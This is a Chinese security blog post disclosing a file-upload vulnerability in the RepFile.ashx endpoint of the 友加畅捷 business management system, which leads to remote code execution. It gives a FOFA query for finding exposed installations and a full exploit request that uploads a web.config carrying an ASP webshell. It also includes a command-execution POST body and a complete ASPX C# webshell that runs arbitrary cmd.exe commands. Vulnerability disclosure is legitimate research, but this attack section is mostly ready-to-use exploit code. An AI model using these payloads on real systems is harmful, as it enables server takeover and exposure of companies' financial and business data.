---
title: "友加畅捷管理系统 RepFile.ashx 文件上传漏洞"
source: https://mrxn.net/jswz/youjiasoft-ReportDesign-RepFile-upload-rce.html
asset_dir: assets/友加畅捷管理系统-repfile.ashx-文件上传漏洞
---

# 友加畅捷管理系统 RepFile.ashx 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/12/9 08:30
* 614浏览
* [0评论](#comment)
* 39分钟阅读

深入探索

软件

SQL

安全运维咨询


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

友加畅捷管理系统是一款专为小微商贸流通企业设计的财务业务一体化管理软件，涵盖进销存、财务、分销及移动管理等多个模块，旨在帮助企业实现高效的业务运营和财务核算。

漏洞修复方案

该系统在 `RepFile.ashx` 文件上传接口中存在[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞。由于系统在处理上传文件时会使用 `xmlDoc.Load` 进行加载，这导致攻击者只能成功上传能够被 XML 解析器正确解析的文件。尽管上传的文件类型受到 XML 格式的限制，但恶意攻击者仍可能利用此漏洞，通过构造恶意的 XML 文件，结合其他潜在的解析或处理缺陷，实现拒绝服务、信息泄露，甚至在特定条件下进一步导致[远程代码执行](https://mrxn.net/tag/rce)，对系统的可用性、完整性和机密性构成威胁。

# 影响版本

18.8000.1083.1000

# fofa语法

> icon\_hash="2049187099" || fid="zzt8lL7SUwIIZQXZY6rTSw=="

# 漏洞分析

直接查看 `/ReportDesign/RepFile.ashx` 代码执行逻辑

物流软件安全

[![友加畅捷管理系统 RepFile.ashx 文件上传漏洞](images/img-001-1dd523b0e552.webp)](https://image.mrxn.net/d6db087ee6bb438aa5894ce03426e870.webp)

根据参数`Type` 进入不同的处理逻辑，当`Type=SaveRepFileData` 时，看下它的实现逻辑

深入探索

文本剥离工具

漏洞扫描服务

数据库

[![友加畅捷管理系统 RepFile.ashx 文件上传漏洞](images/img-002-a50acbfd1d5a.webp)](https://image.mrxn.net/a91f11477ccc4de8bd0ad138bc573f49.webp)

参数`RepFile`的值被拼接在`Report`目录下，然后使用`XmlDocument`进行解析`context.Request.InputStream` 这个由用户控制的文件内容，最后使用`xmlDoc.Save`对内容进行保存。因此可上传能被xml解析的文件，比如魔改版的web.config来进行[执行代码](https://mrxn.net/tag/rce)。

深入探索

安全

身份验证

VPN服务

# 漏洞复现

```
POST /ReportDesign/RepFile.ashx?RepFile=pages/web.config&Type=SaveRepFileData HTTP/1.1
Host: youjiasoft.mrxn.net
SOAPAction: http://tempuri.org/login
Content-Type: application/x-www-form-urlencoded

<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".config" />
        </fileExtensions>
        <hiddenSegments>
          <remove segment="web.config" />
        </hiddenSegments>
      </requestFiltering>
    </security>
  </system.webServer>
  <system.web>
        <authorization>
            <allow users="*" />  
        </authorization>
    </system.web>
</configuration>
<!--
<%
Response.CodePage = 65001
Response.Charset = "UTF-8"
Response.write("-"&"->")
Response.write(1+2)
on error resume next
Response.write("<pre>")
if execute(request("pass")) <>"" then execute(request("pass"))
Response.write("</pre>")
Response.write("<!-"&"-")
%>
-->
```

可以看到成功[上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0) `web.config` 文件到 `Report/Pages` 目录下，但是不能解析，因为IIS的请求筛选配置如下

漏洞修复方案

[![友加畅捷管理系统 RepFile.ashx 文件上传漏洞](images/img-003-7ab5a23726b6.webp)](https://image.mrxn.net/2bb11131f5364cc39caa7102476b3a6a.webp)

但是访问是不能执行的，因为在IIS的【**请求筛选**】配置里可以明显看到 .config 出现在配置里，是不允许执行的

[![友加畅捷管理系统 RepFile.ashx 文件上传漏洞](images/img-004-503bfce02580.webp)](https://image.mrxn.net/c87d47a3ca1f4e5f9be4c4d2f3b7b07d.webp)

访问会出现如下所示提示

[![友加畅捷管理系统 RepFile.ashx 文件上传漏洞](images/img-005-6206f239d6ff.webp)](https://image.mrxn.net/3b980cfc8b164b32b1468c37c20dcb8e.webp)

> 由于已明确禁止所请求的页类型，无法对该类型的页提供服务。扩展名“.config”可能不正确。 请检查以下的 URL 并确保其拼写正确。

因此这个[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)利用有限? nonono！

我们直接将上传后缀修改成 asp（因为web.config webshell部分本身就asp代码）

[![友加畅捷管理系统 RepFile.ashx 文件上传漏洞](images/img-006-280f130888c2.webp)](https://image.mrxn.net/ad3d83d596e14258977801ad3d2a6d74.webp)

访问 `/Report/Pages/shell.asp` ，post如下数据即可[getshell](https://mrxn.net/tag/rce)

```
data=Response.Write(GetObject(%22new:72C24DD5-D70A-438B-8A42-98424B88AFB8%22).exec(%22cmd.exe%20/c%20tasklist%22).StdOut.ReadAll())
```

成功[执行](https://mrxn.net/tag/rce)**tasklist**命令

[![友加畅捷管理系统 RepFile.ashx 文件上传漏洞](images/img-007-72d0597266b4.webp)](https://image.mrxn.net/214126b9a1c044e6a0a8ec33aafd2716.webp)

或者使用下面的aspx webshell来执行，它也满足**格式良好 (well-formed)** 的XML，可以被正常解析并保存。

```
<script runat="server" language="C#">
    protected void Page_Load(object sender, EventArgs e)
    {
        Response.Clear();
        Response.ContentType = "text/plain";
        try
        {
            string command = Request["cmd"];
            if (string.IsNullOrEmpty(command))
            {
                return;
            }
            System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c " + command;
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            using (System.Diagnostics.Process process = System.Diagnostics.Process.Start(psi))
            {
                using (System.IO.StreamReader reader = process.StandardOutput)
                {
                    string result = reader.ReadToEnd();
                    Response.Write(result);
                }
            }
        }
        catch (System.Exception ex)
        {
            Response.Write("Error executing command: " + ex.Message + "\n");
            Response.Write(ex.StackTrace);
        }
        finally
        {
            Response.End();
        }
    }
</script>
```

[![友加畅捷管理系统 RepFile.ashx 文件上传漏洞](images/img-008-bef26f15fd9a.webp)](https://image.mrxn.net/7dc48060d36d42fd924de986f26d44e2.webp)

[![友加畅捷管理系统 RepFile.ashx 文件上传漏洞](images/img-009-b209782e96b0.webp)](https://image.mrxn.net/fc5c66ad3d1e4be3a7c8e32023f6b891.webp)

也是可以[执行命令](https://mrxn.net/tag/rce)的如上图所示，成功执行 **tasklist** 命令，并回显结果

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[友加畅捷管理系统 RepFile.ashx 文件上传漏洞](https://mrxn.net/jswz/youjiasoft-ReportDesign-RepFile-upload-rce.html)  
文章链接：<https://mrxn.net/jswz/youjiasoft-ReportDesign-RepFile-upload-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

Windows安全工具

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALOElEQVR4Aeyci3LcthJEdfL//5xo1D4UMQTIlWVrtyp0GWn2YwYQhptY9vX95+3t7d/fWf8ufqx6Ge++urjy1XtOXniV0b/C6lXLXD2frZ6T/w7WQN7r7p+vcgPbQN7fgLdHVj848AZ0+dAL+Mi5Ry+AuQ/Re14O8YFtT4jWM33vznteLkL6woj6He1/hfu6bSB78X5+3g0cBgLj9CF8dUSn331IHQR7Tg7xe72+qA/Jq+/RzF6rZ/WOMPbqftXWgjFXWq2eX3FIPYw4yx8GMgvd2s/dwB8bCGT69ebU+t0vAdLHehh59a4F0eETrREhXuVrqV9hZWuZq+dakH7qYnm15N/BPzaQ7xzirv28gb8+kHpzakHeLhjRo1Rmv9RFPUi9+h4hHgT1YOTqX0XPYF3n6t/Bvz6Q7xzu/1h7GIhT77i6HMjbZ/4j9/4POcR/l4af+oow5iC858yrz3CVgbGnteZFSK5ziA5B/St0n46zusNAZqFb+7kb2AYCmTqc49XRIPU959vRdbk+pL5zcx0heaBbGweG3yWAcAMQ7p7qHVc+pL7nITqc475uG8hevJ+fdwP/OPWv4nePDHlr7AMjV/dc8o76hd274nC+J8Sv3rVgzvs+lf3ddX9C+m0+mV8OBPJWwBx9E66+Dki9edG6ziF5fZhziA6f2GvsDcnoi/ryFZqDeR/rID4E1TvC0b8cSG9y8797A4eBwHFqdQTfDrG0WpA8BEv7yur9rO36Fa86Mx1hPNvKh3muep8t+51lZt6s7jCQWeGt/dwN/APjW3G1NSQ/m+5ZrXlIfc/Cpd5LHubuLfbClW4OcjYIqvc6GH1zEB1G1N/j/QnZ38YLPG/fh0Cm59ThnPezW6cOqV9x9Y69T+fmYexfOowahEOwMrMFcx9G3bOI9oJ5Tl/sdeqQeuDt/oS8vdaP7b8hTg8yrdUx4dy3j2gfuQhjn67D6Pc+nVtf2D25COkNQfWqrSXvCGO++3JIrnrVUn8E70/II7f0g5ltIJCprvauSe8XJK8G4RC0j74cRh9Gbk6E+DCifWHUAUs/focXPvlm/Hqwhwh81Pyyt/+dl74I85x1IiRnnbocRr/0bSCGb3zuDWy/yqrp7NfqWDBOFcJ7HkYdwvd71LN1cO5XtpZ5sTSXmrjS9SF7yld5GHPmYa7rrxBSN9vv/oSsbu1J+mEgMJ8ejDqE93P3qUNy6hD+aJ05GOtg5JVb7bHSq+bt/R+QXjDH98jw036D+E66Loex73t0+fMwkGXyNn7kBpYDgUy1nwKiO/2v+j3fOYz93aejdZA8oLQh8PGrJgj2HvKt4NfDSv9lbz1XuZVuffch5wPu79TfXuzH9gmBTGl1PqcqwnkeRh/Cre/7wNyH6DCiffYIyai5R+eQHAT1Res6QvLqEA4j6ov2FSH5mb8NRPPG597AYSBOsR8LMlUI9lznvV4OqZeLq3r1jjDvU/0gnjUQDkH1ys4WJDfzSuv1nVemFqQPjFjeah0Gsgre+s/cwGEgkGm6PYzctwFG3fx3EdIXzrGfAz7/jmE/g1lRXw7jXuqieRGSX/nmOvY8pA984mEgvcnNf/YGDgPpU/Q46pBpykWIbr6jOXVIXh3C9TuaEyF5eWGvgWQguPKrdr/MwVi3z9QzxIdgabWAj+9V6rnWqp96ZVyHgRi68Tk38PCfGML4FnhciC530nIRktMX9Tvqiysf0hfYIquaLdAegI83GoLN3v5cBOJD0Jz7wajDyHveOvXC+xNSt/BC68sDgUwdgn4tThuiy/VFiC/v2OsgeZjjvh7GjF7vqS6ufHVIX3mvg/jqK7Qe1vkvD2S12a3/mRtYDsRpuo28oz6sp25mj3Ceh9F3X3vIZ9gzMPaCcGtXeUhOvyOMvv069rozvhzIWdHt/b0b2P5MHcZpw8g9Asx1fRGS821Rv0L4Wh0kD1y13n4ltQoCH5nVmeHcty8kJxdh1CEcPvH+hHhbL4L3QF5kEB5j+8ZQYf9xVdvjyl/pkI/jvsf+GUa/9+l8X1vP+oXF9wvSu7zZgvj7mkee4bzOvXov9Y773P0J2d/GCzxv/1F3ajCfPkSHEb/6NbiPdZ2rd4Tsqw7hcEQzvTeMWXMQXb7C3q/nIH1gxJ474/cn5Ox2nuBtA4FM1bego2dT7xxS3/XOYczprxCS7/uaVy9UW2FlHlkw3xNGfdWr729OHdIHguqF20CK3Ov5N3AYCGRqMKJThugrvvqSIHXdh1GHkZuHUXd//UI1EVIDwcrsF0SHoF6vv9L1RetFGPubE80VHgZi6Mbn3MDh+5CrY9QUa/UcjG8BjLxqZqv3kUPqrVE/Q0gNBHsW5ro5OPfNiXCeh3PfPnu8PyH723iB58NAfCM7QqYNwdXZe13PwVjf8/Je1zmMfcq/qr3yq0ctSO+eh+iV+crqfayd6YeBGL7xOTewDcRpwfgWQLi+2I/7Vb3XQ/aB4FW/mQ9jrRkR4kPQM+iL6qJ6R/2OkP7mu3/Gt4GchW7v525g+70sGKcKcw7RIbg6Kow+nHP7XL1VMPax7jsI6QnBfgaIDiOag1H3LBBd3hHiwyfen5B+S0/mh4FApuW5INy3QdTvHJLXh5H3vLmVvvJh7GuuEEYPwvseVxxSVz1r9Xxp+9V9OaQPBPc19Wyu8DCQCtzreTewfade09mvfiTIdCFoFsIhqG595zDmINw8zDlE7/2sO0NrID169lHfOvOdQ/rrQ7i5jub2+v0J2d/GCzxvv8rqZ3F6ov4Vh/GtgJFbD9Hl9u945UP6wOdf2Lmq6XtAelgH4eZg5OorhHne/qu60u9PSN3CC63DQOB8uhAfgv1ruXoLIHWrnDokZ3/1FS8dxhoYee9RNbNlTpxl9hqc77PqA6mDTzwMZL/R/fzzN3A5EPicHhz/PQ3xfQsgvH8p+mL35TDWQzjM0bpHENJjdQaIby8Yedchfu8How7hELSPdXu8HIjFN/7MDWwDgUzPabl955Ccfsee79w8jH0g3LxoXuy6fI+rrLoI2VPecd+znrvfeWX2C+b9zfT64ttAitzr+TdwGAhkqhD0iE5VVBdhnodRh3D7wMjt9yhC6oFHS5Y5z2QA+PjrCTCivnmIr97RnNj9PT8MZG/ezz9/A9vvZfWtV9OE87cB5j5E7307h+Q8j74Io2+uEOLBHHsPedXuF6T+7W2vfj5f1cFYDyP/7HR8uj8hxzt5qrL9XpZTF1enetSH8a1Y1UFyEDQH4VfnML/HVc2VDuOe+577Z/vA9/L22eP9Cdnfxgs8b/8NgUwbHsN+dt+gR3XIPtaJ1neu3hHSB+jWxnsvOfDxq6gt+MUH+/QyOO8La//+hPTbfDLfBuK0r3B1Xhinbh/zMPpdh7nfc3LRfQrVxNJqQXpDsPudV00tSB7O0XqxamvJxdJqyeHYdxuIoRufewOHgcBxasDlKWvytXoQ+Pj3dHm1ut85JK8O4VVbq+sQHz6xZ+RVXwuSVe8Ic79qZ8t6SB2M2H25uO95GIihG59zA98eiNOFvBVf/TKs73Uw9oPwnpcX9h7y8mpBeqjDyNUru1/qIqQOgmb1O3ZfLkL6APf/1fjbi/349iekfz2Qaa90iO/b0XPylQ/rems6XvU0D+ltHsL11TtCcuq/m6+6Pz4QD3Xj793AYSA1pdm6am+NORjfGnUR4kPQetGcvCOkzlwhRINgabUgHIKl1bInjHp5tboPY06/smcLxjqzcNQPAzF843NuYBsIZFpwjqtjQur0fXvEK12/I6QvBLs/4+4JqZF37LX6kDoImtMXv6r3Oush+wD3r7LeXuzH9gl5sXP9b4/zHwAAAP//bQZ6RAAAAAZJREFUAwAVkQiYG3mPegAAAABJRU5ErkJggg==)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/youjiasoft-ReportDesign-RepFile-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALOElEQVR4Aeyci3LcthJEdfL//5xo1D4UMQTIlWVrtyp0GWn2YwYQhptY9vX95+3t7d/fWf8ufqx6Ge++urjy1XtOXniV0b/C6lXLXD2frZ6T/w7WQN7r7p+vcgPbQN7fgLdHVj848AZ0+dAL+Mi5Ry+AuQ/Re14O8YFtT4jWM33vznteLkL6woj6He1/hfu6bSB78X5+3g0cBgLj9CF8dUSn331IHQR7Tg7xe72+qA/Jq+/RzF6rZ/WOMPbqftXWgjFXWq2eX3FIPYw4yx8GMgvd2s/dwB8bCGT69ebU+t0vAdLHehh59a4F0eETrREhXuVrqV9hZWuZq+dakH7qYnm15N/BPzaQ7xzirv28gb8+kHpzakHeLhjRo1Rmv9RFPUi9+h4hHgT1YOTqX0XPYF3n6t/Bvz6Q7xzu/1h7GIhT77i6HMjbZ/4j9/4POcR/l4af+oow5iC858yrz3CVgbGnteZFSK5ziA5B/St0n46zusNAZqFb+7kb2AYCmTqc49XRIPU959vRdbk+pL5zcx0heaBbGweG3yWAcAMQ7p7qHVc+pL7nITqc475uG8hevJ+fdwP/OPWv4nePDHlr7AMjV/dc8o76hd274nC+J8Sv3rVgzvs+lf3ddX9C+m0+mV8OBPJWwBx9E66+Dki9edG6ziF5fZhziA6f2GvsDcnoi/ryFZqDeR/rID4E1TvC0b8cSG9y8797A4eBwHFqdQTfDrG0WpA8BEv7yur9rO36Fa86Mx1hPNvKh3muep8t+51lZt6s7jCQWeGt/dwN/APjW3G1NSQ/m+5ZrXlIfc/Cpd5LHubuLfbClW4OcjYIqvc6GH1zEB1G1N/j/QnZ38YLPG/fh0Cm59ThnPezW6cOqV9x9Y69T+fmYexfOowahEOwMrMFcx9G3bOI9oJ5Tl/sdeqQeuDt/oS8vdaP7b8hTg8yrdUx4dy3j2gfuQhjn67D6Pc+nVtf2D25COkNQfWqrSXvCGO++3JIrnrVUn8E70/II7f0g5ltIJCprvauSe8XJK8G4RC0j74cRh9Gbk6E+DCifWHUAUs/focXPvlm/Hqwhwh81Pyyt/+dl74I85x1IiRnnbocRr/0bSCGb3zuDWy/yqrp7NfqWDBOFcJ7HkYdwvd71LN1cO5XtpZ5sTSXmrjS9SF7yld5GHPmYa7rrxBSN9vv/oSsbu1J+mEgMJ8ejDqE93P3qUNy6hD+aJ05GOtg5JVb7bHSq+bt/R+QXjDH98jw036D+E66Loex73t0+fMwkGXyNn7kBpYDgUy1nwKiO/2v+j3fOYz93aejdZA8oLQh8PGrJgj2HvKt4NfDSv9lbz1XuZVuffch5wPu79TfXuzH9gmBTGl1PqcqwnkeRh/Cre/7wNyH6DCiffYIyai5R+eQHAT1Res6QvLqEA4j6ov2FSH5mb8NRPPG597AYSBOsR8LMlUI9lznvV4OqZeLq3r1jjDvU/0gnjUQDkH1ys4WJDfzSuv1nVemFqQPjFjea